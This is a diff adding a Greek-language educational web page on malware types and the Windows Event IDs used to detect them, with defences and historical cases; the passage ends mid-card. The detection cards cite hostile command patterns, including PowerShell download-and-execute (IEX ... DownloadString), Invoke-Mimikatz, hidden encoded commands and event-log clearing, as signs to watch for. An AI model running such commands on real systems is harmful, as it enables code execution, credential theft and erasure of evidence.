+                    <p>Downloads από μη επίσημες πηγές, cracked apps, phishing.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-434">CWE-434</button>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Λήψη από επίσημες πηγές, antivirus, έλεγχος ψηφιακών υπογραφών.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>Zeus (2007-):</strong> Έκλεψε τραπεζικά credentials (~$70M+). <strong>Emotet (2014-2021):</strong> 1.7M+ συστήματα.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Virus</h2>
+                    <span class="cwe-badge">Virus</span>
+                </div>
+                <p class="short-desc">Προσκολλάται σε αρχεία και εξαπλώνεται όταν ο χρήστης τα εκτελέσει.</p>
+                <button class="toggle-btn" data-target="m-virus">Ανάλυση</button>
+                <div class="details" id="m-virus">
+                    <h4>Τι είναι</h4>
+                    <p>Κώδικας που «κολλάει» σε εκτελέσιμα ή έγγραφα. Όταν ανοίξεις το αρχείο, ενεργοποιείται και αντιγράφεται.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>USB, συνημμένα .exe/.doc με macros, μη ασφαλή downloads.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-434">CWE-434</button>
+                        <button class="cwe-link" data-cwe="CWE-79">CWE-79</button>
+                        <button class="cwe-link" data-cwe="CWE-20">CWE-20</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Antivirus, απενεργοποίηση macros, έλεγχος USB, sandboxing.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>Michelangelo (1992):</strong> Κατέστρεφε τον δίσκο στις 6 Μαρτίου. <strong>ILOVEYOU (2000):</strong> 10M+ μολύνσεις, $10 δισ.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Spyware</h2>
+                    <span class="cwe-badge">Spyware</span>
+                </div>
+                <p class="short-desc">Κατασκοπεύει τον χρήστη, συλλέγοντας κρυφά δεδομένα.</p>
+                <button class="toggle-btn" data-target="m-spyware">Ανάλυση</button>
+                <div class="details" id="m-spyware">
+                    <h4>Τι είναι</h4>
+                    <p>Εγκαθίσταται κρυφά και στέλνει ιστορικό browsing, screenshots, κωδικούς σε απομακρυσμένο server.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>Δωρεάν apps, adware bundles, phishing, 0-days.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-79">CWE-79</button>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                        <button class="cwe-link" data-cwe="CWE-20">CWE-20</button>
+                        <button class="cwe-link" data-cwe="CWE-416">CWE-416</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Anti-spyware, έλεγχος δικαιωμάτων, αποφυγή sideloading.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>Pegasus (NSO Group):</strong> Zero-click iMessage exploit — στοχοποίησε δημοσιογράφους (Project Pegasus 2021).</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Rootkit</h2>
+                    <span class="cwe-badge">Rootkit</span>
+                </div>
+                <p class="short-desc">Κρύβει την παρουσία του malware σε βαθύ επίπεδο του λειτουργικού.</p>
+                <button class="toggle-btn" data-target="m-rootkit">Ανάλυση</button>
+                <div class="details" id="m-rootkit">
+                    <h4>Τι είναι</h4>
+                    <p>Σουίτα που αποκτά root/admin και τροποποιεί τον πυρήνα για να «κρύβει» processes, αρχεία, συνδέσεις.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>Exploits kernel, κακόβουλοι drivers, μη υπογεγραμμένος κώδικας.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-416">CWE-416</button>
+                        <button class="cwe-link" data-cwe="CWE-787">CWE-787</button>
+                        <button class="cwe-link" data-cwe="CWE-120">CWE-120</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Secure Boot, υπογεγραμμένοι drivers, EDR, επανεγκατάσταση αν υποψιαστείς.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>Sony BMG Rootkit (2005):</strong> Κρυμμένο σε CDs μουσικής, μόλυνε εκατομμύρια PCs.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Keylogger</h2>
+                    <span class="cwe-badge">Keylogger</span>
+                </div>
+                <p class="short-desc">Καταγράφει κάθε πάτημα πλήκτρου, κλέβοντας κωδικούς.</p>
+                <button class="toggle-btn" data-target="m-keylogger">Ανάλυση</button>
+                <div class="details" id="m-keylogger">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφει κάθε πάτημα πλήκτρου και το στέλνει στον επιτιθέμενο: passwords, μηνύματα, κάρτες.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>Κακόβουλα downloads, phishing, browser extensions, δημόσιο Wi-Fi.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-79">CWE-79</button>
+                        <button class="cwe-link" data-cwe="CWE-434">CWE-434</button>
+                        <button class="cwe-link" data-cwe="CWE-20">CWE-20</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Antivirus, 2FA, virtual keyboards, password managers.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>DarkHotel APT (2007-):</strong> Keylogger μέσω κακόβουλων updates σε πολυτελή ξενοδοχεία.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Botnet</h2>
+                    <span class="cwe-badge">Botnet</span>
+                </div>
+                <p class="short-desc">Δίκτυο μολυσμένων υπολογιστών που ελέγχονται από botmaster.</p>
+                <button class="toggle-btn" data-target="m-botnet">Ανάλυση</button>
+                <div class="details" id="m-botnet">
+                    <h4>Τι είναι</h4>
+                    <p>Χιλιάδες μολυσμένες συσκευές που δέχονται εντολές από C&amp;C server: DDoS, spam, cryptomining.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>IoT με default passwords, μη ενημερωμένα λειτουργικά, αδύναμα SSH/Telnet.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-798">CWE-798</button>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                        <button class="cwe-link" data-cwe="CWE-78">CWE-78</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Αλλαγή default passwords, ενημερώσεις firmware, firewall, IDS.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>Mirai (2016):</strong> 600.000+ IoT συσκευές. DDoS 1 Tbps στο Dyn — «έριξε» Twitter, Netflix, Reddit.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>RAT (Remote Access Trojan)</h2>
+                    <span class="cwe-badge">RAT</span>
+                </div>
+                <p class="short-desc">Δίνει στον επιτιθέμενο πλήρη απομακρυσμένο έλεγχο του υπολογιστή.</p>
+                <button class="toggle-btn" data-target="m-rat">Ανάλυση</button>
+                <div class="details" id="m-rat">
+                    <h4>Τι είναι</h4>
+                    <p>Trojan + backdoor: ο attacker βλέπει οθόνη, ελέγχει webcam/μικρόφωνο, κατεβάζει αρχεία, εκτελεί εντολές.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>Κακόβουλα συνημμένα, fake installers, malicious ads.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-434">CWE-434</button>
+                        <button class="cwe-link" data-cwe="CWE-78">CWE-78</button>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>Antivirus, firewall, έλεγχος εξερχόμενων συνδέσεων, application whitelisting.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>DarkComet (2010s):</strong> Χρησιμοποιήθηκε στη Συρία για παρακολούθηση ακτιβιστών. <strong>njRAT:</strong> Μέση Ανατολή.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>Fileless Malware</h2>
+                    <span class="cwe-badge">Fileless</span>
+                </div>
+                <p class="short-desc">Ζει στη μνήμη, χρησιμοποιώντας νόμιμα εργαλεία του συστήματος.</p>
+                <button class="toggle-btn" data-target="m-fileless">Ανάλυση</button>
+                <div class="details" id="m-fileless">
+                    <h4>Τι είναι</h4>
+                    <p>Δεν γράφει αρχείο στον δίσκο — εκτελείται στη RAM μέσω PowerShell, WMI, macros, registry.</p>
+                    <h4>Πώς είμαστε ευάλωτοι</h4>
+                    <p>Ύποπτα PowerShell scripts, macro-enabled Office, χωρίς EDR/whitelisting.</p>
+                    <h4>Ποιες ευπάθειες εκμεταλλεύεται</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-78">CWE-78</button>
+                        <button class="cwe-link" data-cwe="CWE-94">CWE-94</button>
+                        <button class="cwe-link" data-cwe="CWE-20">CWE-20</button>
+                        <button class="cwe-link" data-cwe="CWE-79">CWE-79</button>
+                    </p>
+                    <h4>Πρόληψη &amp; Άμυνα</h4>
+                    <p>EDR, περιορισμός PowerShell, απενεργοποίηση macros, whitelisting.</p>
+                    <h4>Ιστορικό Παράδειγμα</h4>
+                    <p><strong>Astaroth (2018-2019):</strong> Fileless malware σε Βραζιλία/Ευρώπη. <strong>Kovter (2016):</strong> Ζούσε σε registry keys.</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ================= TAB 3 : EVENT IDs ================= -->
+    <div class="tab-panel" id="tab-events">
+        <div class="grid">
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>4624 — Successful Logon</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Καταγράφεται κάθε επιτυχημένη σύνδεση χρήστη στο σύστημα.</p>
+                <button class="toggle-btn" data-target="e-4624">Ανάλυση</button>
+                <div class="details" id="e-4624">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται στο <strong>Security log</strong> κάθε φορά που κάποιος συνδέεται επιτυχώς — τοπικά, μέσω RDP, δικτύου, ή service account. Περιέχει: λογαριασμό, τύπο logon (2=interactive, 3=network, 10=RDP), IP προέλευσης, process.</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-info">Πληροφοριακό</span> — από μόνο του δεν είναι κακό, αλλά είναι <strong>κρίσιμο για baseline</strong> και ανίχνευση ύποπτων συνδέσεων.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                        <button class="cwe-link" data-cwe="CWE-798">CWE-798</button>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>RAT, Trojan, Botnet — κάθε malware που ανοίγει backdoor ή κλέβει credentials.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Πολλαπλές συνδέσεις από άγνωστες IP, logon σε ώρες μη εργάσιμες, logon με <code>LogonType=10</code> (RDP) χωρίς λόγο, σύνδεση με service accounts από περίεργα processes, «άγνωστες» συνεδρίες στα <em>Task Manager → Users</em> ή στο <code>query user</code>.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Έλεγχος πηγής IP, αποσύνδεση ύποπτης συνεδρίας, αλλαγή κωδικών, ενεργοποίηση 2FA, έλεγχος για persistence (scheduled tasks, services, startup).</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>4625 — Failed Logon</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Αποτυχημένη προσπάθεια σύνδεσης — ένδειξη brute-force ή λάθος credentials.</p>
+                <button class="toggle-btn" data-target="e-4625">Ανάλυση</button>
+                <div class="details" id="e-4625">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται κάθε αποτυχημένη σύνδεση, με αιτία (λάθος password, λογαριασμός disabled, expired).</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-high">Υψηλή</span> — πολλά 4625 σε σύντομο χρόνο = <strong>brute-force</strong> ή <strong>password spraying</strong>.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                        <button class="cwe-link" data-cwe="CWE-307">CWE-307</button>
+                        <button class="cwe-link" data-cwe="CWE-521">CWE-521</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Botnet (credential stuffing), Ransomware (RDP brute-force πριν την κρυπτογράφηση), Worm.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Εκατοντάδες 4625 από την ίδια IP, δοκιμές σε πολλούς λογαριασμούς (spraying), αυξημένη χρήση CPU/δικτύου, «κλείδωμα» λογαριασμών χωρίς λόγο, ύποπτη κίνηση σε port 3389 (RDP) ή 22 (SSH).</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Block IP στο firewall, account lockout policy, rate limiting, αλλαγή σε 2FA, αποφυγή έκθεσης RDP στο Internet (VPN αντί).</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>4672 — Special Privileges</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Αποδίδονται ειδικά προνόμια (admin) σε νέα σύνδεση.</p>
+                <button class="toggle-btn" data-target="e-4672">Ανάλυση</button>
+                <div class="details" id="e-4672">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται όταν ένας χρήστης συνδεθεί και λάβει <strong>ειδικά προνόμια</strong>: SeDebugPrivilege, SeBackupPrivilege, SeTcbPrivilege. Συνήθως σημαίνει admin/root.</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-high">Υψηλή</span> — κάθε 4672 από μη-αναμενόμενο λογαριασμό είναι ύποπτο.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-269">CWE-269</button>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Rootkit, RAT, Fileless Malware — για privilege escalation.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Σύνδεση χρήστη-μη-διαχειριστή που αποκτά admin, νέα processes με SYSTEM privileges, αλλαγές σε services/registry, εκτέλεση <code>whoami /priv</code> που δείχνει SeDebugPrivilege ενεργό.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Έλεγχος αν ο χρήστης πρέπει να έχει αυτά τα προνόμια, περιορισμός τοπικών admins, χρήση Just Enough Administration (JEA), Privileged Access Workstations.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>4688 — Process Creation</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Καταγράφεται κάθε νέα διεργασία που ξεκινά στο σύστημα.</p>
+                <button class="toggle-btn" data-target="e-4688">Ανάλυση</button>
+                <div class="details" id="e-4688">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφει κάθε νέο process: όνομα, γονικό process, command line (αν είναι ενεργοποιημένο), χρήστη.</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-high">Υψηλή</span> — βασικό εργαλείο ανίχνευσης κακόβουλων ενεργειών.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-78">CWE-78</button>
+                        <button class="cwe-link" data-cwe="CWE-94">CWE-94</button>
+                        <button class="cwe-link" data-cwe="CWE-434">CWE-434</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Ransomware, RAT, Fileless Malware, Trojan.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p><code>powershell.exe</code> να εκτελεί base64 encoded commands, <code>cmd.exe</code> να καλεί <code>certutil</code>, <code>bitsadmin</code>, <code>wmic</code>, <code>rundll32</code>, ύποπτα processes από <code>%TEMP%</code>, <code>AppData</code>, <code>Downloads</code> — ο έλεγχος γίνεται με Process Explorer / Sysinternals.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Ενεργοποίηση <strong>Command Line Auditing</strong>, EDR με process tree analysis, application whitelisting, kill ύποπτου process, απομόνωση host.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>4698 — Scheduled Task Created</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Δημιουργήθηκε νέα προγραμματισμένη εργασία — κλασικό persistence.</p>
+                <button class="toggle-btn" data-target="e-4698">Ανάλυση</button>
+                <div class="details" id="e-4698">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται όταν δημιουργείται scheduled task μέσω <code>schtasks</code>, Task Scheduler GUI, ή PowerShell.</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-high">Υψηλή</span> — τεχνική <strong>persistence</strong> (T1053.005) που χρησιμοποιείται από όλα σχεδόν τα malware.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-78">CWE-78</button>
+                        <button class="cwe-link" data-cwe="CWE-94">CWE-94</button>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Ransomware, RAT, Fileless Malware, Trojan.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Στο <code>Task Scheduler</code> εμφανίζονται ύποπτες εργασίες με περίεργα ονόματα (π.χ. «WindowsUpdate» που δείχνει σε <code>%TEMP%</code>), εκτέλεση κάθε λίγα λεπτά, task που τρέχει PowerShell με encoded εντολή, «άγνωστα» tasks χωρίς συγγραφέα.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Έλεγχος όλων των tasks, διαγραφή ύποπτων, έλεγχος για άλλα persistence (services, registry Run keys, startup folder), απομόνωση host.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>4720 — User Account Created</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Δημιουργήθηκε νέος λογαριασμός χρήστη — ύποπτο αν δεν είναι αναμενόμενο.</p>
+                <button class="toggle-btn" data-target="e-4720">Ανάλυση</button>
+                <div class="details" id="e-4720">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται κάθε νέος τοπικός ή domain λογαριασμός, μαζί με ποιος τον δημιούργησε.</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-critical">Κρίσιμη</span> — η δημιουργία «backdoor» χρήστη είναι κλασική ενέργεια μετά από compromise.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                        <button class="cwe-link" data-cwe="CWE-269">CWE-269</button>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Ransomware (δημιουργεί admin πριν κρυπτογραφήσει), RAT, Rootkit.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Άγνωστος χρήστης στο <em>Settings → Accounts</em> ή στο <code>net user</code>, νέος φάκελος στο <code>C:\Users\</code>, σύνδεση σε ώρες εκτός ωραρίου, αλλαγή στο προφίλ του νέου χρήστη, login events 4624 για το νέο account.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Έλεγχος νομιμότητας, άμεση διαγραφή αν είναι κακόβουλος (<code>net user X /delete</code>), έλεγχος πώς αποκτήθηκε πρόσβαση, rotation κωδικών, αύξηση monitoring.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>4732 — Member Added to Group</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Χρήστης προστέθηκε σε τοπική ομάδα — π.χ. Administrators.</p>
+                <button class="toggle-btn" data-target="e-4732">Ανάλυση</button>
+                <div class="details" id="e-4732">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται όταν ένας χρήστης προστίθεται σε security group (π.χ. Administrators, Remote Desktop Users).</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-critical">Κρίσιμη</span> — αν προστεθεί σε Administrators, ο attacker έχει πλήρη έλεγχο.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-269">CWE-269</button>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                        <button class="cwe-link" data-cwe="CWE-287">CWE-287</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Ransomware, Rootkit, RAT — για privilege escalation και persistence.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Στο <em>Computer Management → Local Users and Groups</em> εμφανίζονται άγνωστοι λογαριασμοί στα Administrators. Στο <code>net localgroup administrators</code> βλέπουμε μέλη που δεν αναγνωρίζουμε. Μπορεί να συνοδεύεται από νέα processes με SYSTEM privileges.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Αφαίρεση του χρήστη από την ομάδα, έλεγχος ποιος έκανε την αλλαγή, audit σε όλα τα privileged groups, ενεργοποίηση alerting για 4732.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>7045 — Service Installed</h2>
+                    <span class="cwe-badge">System Log</span>
+                </div>
+                <p class="short-desc">Εγκαταστάθηκε νέα υπηρεσία συστήματος — άλλο ένα κλασικό persistence.</p>
+                <button class="toggle-btn" data-target="e-7045">Ανάλυση</button>
+                <div class="details" id="e-7045">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται στο <strong>System log</strong> κάθε νέα Windows service, με path εκτελέσιμου, όνομα, τύπο εκκίνησης.</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-critical">Κρίσιμη</span> — τεχνική persistence (T1543.003). Το malware συχνά εγκαθιστά service για να επιβιώσει από reboot.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-269">CWE-269</button>
+                        <button class="cwe-link" data-cwe="CWE-78">CWE-78</button>
+                        <button class="cwe-link" data-cwe="CWE-94">CWE-94</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Ransomware, Rootkit, Fileless Malware, RAT.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Στο <code>services.msc</code> ή στο <code>sc query</code> εμφανίζονται ύποπτες υπηρεσίες (π.χ. «WindowsHelper» με path <code>C:\Users\Public\svc.exe</code>). Νέα services με τυχαία ονόματα, services που ξεκινούν αυτόματα αλλά δεν έχουν περιγραφή, «Microsoft» services που δεν είναι υπογεγραμμένα από Microsoft.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Έλεγχος ψηφιακής υπογραφής, διαγραφή ύποπτης υπηρεσίας (<code>sc delete</code>), απομόνωση host, πλήρης scan, έλεγχος για άλλα persistence.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>1102 — Audit Log Cleared</h2>
+                    <span class="cwe-badge">Security Log</span>
+                </div>
+                <p class="short-desc">Κάποιος έσβησε το Security log — συντριπτική ένδειξη επίθεσης.</p>
+                <button class="toggle-btn" data-target="e-1102">Ανάλυση</button>
+                <div class="details" id="e-1102">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται όταν κάποιος καθαρίζει το <strong>Security event log</strong> — συχνά ο τελευταίος καταγεγραμμένος event πριν χαθούν όλα τα ίχνη.</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-critical">Κρίσιμη</span> — σχεδόν <strong>πάντα</strong> κακόβουλη ενέργεια (T1070.001).</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-269">CWE-269</button>
+                        <button class="cwe-link" data-cwe="CWE-862">CWE-862</button>
+                        <button class="cwe-link" data-cwe="CWE-778">CWE-778</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Ransomware, APT, Rootkit — ο attacker θέλει να σβήσει ίχνη.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Το Security log εμφανίζεται κενό ή με ημερομηνία τελευταίας εγγραφής πολύ πρόσφατη. Το <code>wevtutil qe Security /c:1 /rd:true</code> δείχνει μόνο το 1102. Άλλα logs (System, Application, PowerShell) μπορεί να λείπουν επίσης. Ύποπτη εκτέλεση <code>wevtutil cl</code> ή <code>Clear-EventLog</code>.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Άμεση απομόνωση host, forward logs σε SIEM/remote server, έλεγχος με άλλα logs (Sysmon, firewall, EDR), αλλαγή δικαιωμάτων στο log (μόνο SYSTEM), ανάκτηση από shadow copies αν υπάρχουν.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>4104 — PowerShell Script Block</h2>
+                    <span class="cwe-badge">PowerShell Log</span>
+                </div>
+                <p class="short-desc">Καταγράφεται ο κώδικας PowerShell που εκτελέστηκε — χρυσωρυχείο για forensics.</p>
+                <button class="toggle-btn" data-target="e-4104">Ανάλυση</button>
+                <div class="details" id="e-4104">
+                    <h4>Τι είναι</h4>
+                    <p>Με ενεργοποιημένο <strong>Script Block Logging</strong>, καταγράφεται το πλήρες script (ακόμα και αν είναι ofuscated).</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-high">Υψηλή</span> — αποκαλύπτει ύποπτες εντολές που άλλα logs κρύβουν.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-78">CWE-78</button>
+                        <button class="cwe-link" data-cwe="CWE-94">CWE-94</button>
+                        <button class="cwe-link" data-cwe="CWE-20">CWE-20</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Fileless Malware, Ransomware (PowerShell-based), RAT, Emotet.</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Στο <em>Event Viewer → Applications and Services Logs → Microsoft → Windows → PowerShell → Operational</em> βλέπουμε ύποπτο κώδικα: <code>IEX(New-Object Net.WebClient).DownloadString(...)</code>, <code>-EncodedCommand</code>, base64, <code>Invoke-Mimikatz</code>, <code>DownloadFile</code>, <code>-nop -w hidden -c</code>. Στο Task Manager μπορεί να βλέπουμε PowerShell να τρέχει διαρκώς με κρυφό παράθυρο.</p>
+                    <h4>Αντιμετώπιση</h4>
+                    <p>Ενεργοποίηση Script Block Logging σε όλα τα hosts, περιορισμός σε Constrained Language Mode, block συγκεκριμένων cmdlets, EDR με PowerShell inspection.</p>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h2>1116 — Defender: Malware Detected</h2>
+                    <span class="cwe-badge">Defender Log</span>
+                </div>
+                <p class="short-desc">Το Windows Defender εντόπισε κακόβουλο λογισμικό στο σύστημα.</p>
+                <button class="toggle-btn" data-target="e-1116">Ανάλυση</button>
+                <div class="details" id="e-1116">
+                    <h4>Τι είναι</h4>
+                    <p>Καταγράφεται από το <strong>Windows Defender</strong> όταν ανιχνευτεί malware, με όνομα, path, ενέργεια (block/quarantine/clean).</p>
+                    <h4>Κρισιμότητα</h4>
+                    <p><span class="sev sev-critical">Κρίσιμη</span> — σοβαρή ένδειξη ότι το σύστημα έχει μολυνθεί ή προσπαθεί να μολυνθεί.</p>
+                    <h4>Σχετιζόμενες ευπάθειες</h4>
+                    <p>
+                        <button class="cwe-link" data-cwe="CWE-434">CWE-434</button>
+                        <button class="cwe-link" data-cwe="CWE-20">CWE-20</button>
+                    </p>
+                    <h4>Σχετιζόμενο malware</h4>
+                    <p>Όλα τα είδη (Trojan, Ransomware, Worm, Keylogger κ.λπ.).</p>
+                    <h4>Πώς το διαπιστώνουμε (τι βλέπουμε)</h4>
+                    <p>Pop-up notification από Defender, εικονίδιο <strong>κόκκινης ασπίδας</strong> στο taskbar, quarantine list με ύποπτα αρχεία, αυξημένη χρήση CPU/δικτύου, αρχεία στο <code>%TEMP%</code> ή <code>Downloads</code> με παράξενα ονόματα, ύποπτα processes στο Task Manager.</p>
+                    <h4>Αντιμετώπιση</h4>
